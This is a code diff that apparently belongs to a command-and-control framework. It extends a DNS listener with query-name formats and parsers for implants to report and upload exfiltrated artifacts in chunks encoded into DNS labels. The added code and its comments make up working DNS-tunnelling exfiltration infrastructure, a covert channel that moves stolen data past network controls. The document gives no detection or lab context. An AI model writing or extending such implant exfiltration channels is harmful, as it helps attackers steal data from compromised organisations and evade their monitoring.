@@ -40,6 +40,20 @@ namespace Rod.Transport.Listeners.Dns;
 //   the staged tag for a key-bound implant; the sequence indexes 200-byte
 //   slices from the honored seam.
 //
+//   exfil seam probe (how many bytes does the server hold of this run?,
+//   ADR-010's upload arm): the name-hash is the first 16 SHA-256 bytes of
+//   the artifact name, the answer TXT the decimal held count:
+//     x.<b32(task id)>.<b32(sha128 of name)>.<b32(implant id)>.<zone>
+//
+//   exfil upload chunk (the sealed-only upstream arm, e.-shaped): the
+//   client-chosen stream id keys the reassembly, the terminal chunk is one
+//   sealed ExfilChunk slice under the exfil tag, and the implant id rides
+//   the name like every upstream contact:
+//     u.<b32(stream id)>.<seq>.<t|m>.<b32(sealed chunk)>.<b32(implant id)>.<zone>
+//   answered "+" while chunks assemble; a plaintext reassembly is dropped
+//   (the arm is sealed-only -- a forged MB-scale artifact store entry keyed
+//   by the task id the query name leaks is the surface the seal closes).
+//
 // A poll is answered with zero or one TXT record whose strings concatenate to
 // the base32 of a signed rod.v1 TaskRequest; a result is answered with an
 // empty NOERROR answer. The chunk sequence is 0-origin decimal; the terminal
@@ -113,6 +127,25 @@ internal static class DnsContactNames
     /// and the chunk index within it.
     /// </summary>
     internal sealed record StagedDownloadProbe(byte[] Token, int Sequence);
+
+    /// <summary>
+    /// One exfil seam probe (ADR-010's upload arm): the byte count the
+    /// server holds of the named run. The name hash is the first 16
+    /// SHA-256 bytes of the artifact name -- the name itself cannot ride a
+    /// DNS label, and the hash maps back through the placements the bridge
+    /// has seen (a probe ahead of any placement answers zero, which is the
+    /// held truth anyway).
+    /// </summary>
+    internal sealed record ExfilSeamProbe(ImplantId Implant, TaskId Task, byte[] NameSha);
+
+    /// <summary>
+    /// One chunk of a sealed exfil upload stream (the upload arm's
+    /// e.-shaped upstream): the client-chosen stream id keys the
+    /// reassembly; the terminal chunk assembles into one sealed ExfilChunk
+    /// slice under the exfil tag.
+    /// </summary>
+    internal sealed record ExfilUploadChunk(
+        ImplantId Implant, byte[] Stream, int Sequence, bool Terminal, byte[] Chunk);
 
     /// <summary>
     /// One delivery probe: the task the sender reported to, and the first 16
@@ -336,6 +369,56 @@ internal static class DnsContactNames
     }
 
     /// <summary>
+    /// Parses an exfil seam probe against <paramref name="zone"/>:
+    /// x.&lt;task&gt;.&lt;sha128 of name&gt;.&lt;implant&gt;.
+    /// </summary>
+    public static ExfilSeamProbe? TryParseExfilSeam(string name, string zone)
+    {
+        if (!TryStripZone(name, zone, out var labels))
+            return null;
+        if (labels.Length != 4 || labels[0] != "x")
+            return null;
+        if (!TryDecodeId(labels[3], out var implant))
+            return null;
+        if (!TryDecode(labels[1], out var taskBytes)
+            || !TaskId.TryParse(System.Text.Encoding.UTF8.GetString(taskBytes), out var task))
+            return null;
+        if (!TryDecode(labels[2], out var nameSha) || nameSha.Length != 16)
+            return null;
+        return new ExfilSeamProbe(implant, task, nameSha);
+    }
+
+    /// <summary>
+    /// Parses a sealed exfil upload chunk against <paramref name="zone"/>:
+    /// u.&lt;stream&gt;.&lt;seq&gt;.&lt;t|m&gt;.&lt;chunk&gt;.&lt;implant&gt;.
+    /// </summary>
+    public static ExfilUploadChunk? TryParseExfilUpload(string name, string zone)
+    {
+        if (!TryStripZone(name, zone, out var labels))
+            return null;
+        if (labels.Length != 6 || labels[0] != "u")
+            return null;
+        if (!TryDecodeId(labels[5], out var implant))
+            return null;
+        if (!TryDecode(labels[1], out var stream) || stream.Length == 0)
+            return null;
+        var terminal = labels[3] switch
+        {
+            "t" => true,
+            "m" => false,
+            _ => (bool?)null,
+        };
+        if (terminal is null || !int.TryParse(labels[2], out var sequence) || sequence < 0)
+            return null;
+        var chunk = labels[4] == "e"
+            ? Array.Empty<byte>()
+            : TryDecode(labels[4], out var decoded) ? decoded : null;
+        if (chunk is null)
+            return null;
+        return new ExfilUploadChunk(implant, stream, sequence, terminal.Value, chunk);
+    }
+
+    /// <summary>
     /// Parses a delivery probe against <paramref name="zone"/>:
     /// n.&lt;b32(task id)&gt;.&lt;b32(sha128)&gt;.&lt;b32(implant id)&gt;.
     /// </summary>
@@ -381,7 +464,7 @@ internal static class DnsContactNames
         if (head.Length == 0)
             return false;
         labels = head.Split('.');
-        return labels.Length > 0 && labels[0] is "p" or "k" or "r" or "c" or "e" or "a" or "n" or "s" or "d";
+        return labels.Length > 0 && labels[0] is "p" or "k" or "r" or "c" or "e" or "a" or "n" or "s" or "d" or "x" or "u";
     }
 
     private static bool TryDecodeId(string label, out ImplantId implant)
